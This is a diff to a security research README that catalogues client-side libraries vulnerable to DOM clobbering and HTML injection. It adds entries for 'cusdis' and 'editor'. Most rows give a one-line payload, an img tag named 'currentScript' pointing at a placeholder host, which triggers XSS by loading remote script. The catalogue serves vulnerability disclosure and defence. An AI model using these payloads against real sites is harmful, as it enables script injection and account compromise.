@@ -22,6 +22,7 @@ This repository lists client-side libraries that are vulnerable to HTML injectio
 | [Google Closure](./domc-gadgets/google-closure-library.md) | 4.9K | v20230103 | ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>``` | XSS | TheHulk | Accepted | N/A |
 | [pagefind](./domc-gadgets/pagefind.md) | 3.3K | v1.1.0 | ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>``` | XSS | TheHulk | Accepted | CVE-2024-XXXXX |
 | [Mavo](./domc-gadgets/mavo.md) | 2.8K | v0.3.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
+| [cusdis](./domc-gadgets/cusdis.md) | 2.6K | latest | ```<img name="currentScript" data-host="https://xxx.xxx.xxx">``` | XSS | TheHulk | N/A | N/A |
 | [Stage.js](./domc-gadgets/stage.js.md) | 2.4K | v1-alpha | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
 | [inspire.js](./domc-gadgets/inspire.js.md) | 1.7K | v1.10 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
 | [steal](./domc-gadgets/steal.md) | 1.4K | v2.3.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>``` | XSS | TheHulk | Mitre | N/A |
@@ -48,5 +49,6 @@ The following libraries accept user input and output content as `type/html` with
 | [vditor](./html-injection/vditor.md) | 8.3K | v3.10.6 | Type | N/A | Any named property | N/A | N/A |
 | [Froala](./html-injection/froala.md) | 5.3K | v4.2.2 | Copy&Paste | DOMPurify | Any `name` attributes | N/A | N/A |
 | [Zenpen](./html-injection/zenpen.md) | 3.8K | latest | Copy&Paste | N/A | Any named attributes | N/A | N/A |
+| [editor](./html-injection/editor.md) | 2.8K | v0.1.0 | Type | N/A | Any named property | N/A | N/A |
 | [SunEditor](./html-injection/sun-editor.md) | 1.7K | v2.47.0 | Copy&Paste | N/A | `a` tag with `id` | N/A | N/A |
 | [RichTextEditor](./html-injection/richtexteditor.md) | N/A | Latest | Copy&Paste | N/A | Any named property | N/A | N/A |
